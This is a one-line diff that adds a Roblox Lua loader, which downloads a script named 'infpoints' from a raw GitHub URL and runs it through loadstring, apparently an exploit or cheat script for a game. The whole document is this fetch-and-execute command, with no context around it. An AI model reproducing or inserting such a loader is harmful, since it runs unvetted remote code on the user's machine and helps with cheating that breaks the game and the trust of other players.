@@ -1,0 +1,1 @@
+loadstring(game:HttpGet(('https://raw.githubusercontent.com/ImUltik/3U4ND6KsQKgSQCLbkQPKZuT8/main/infpoints')))()
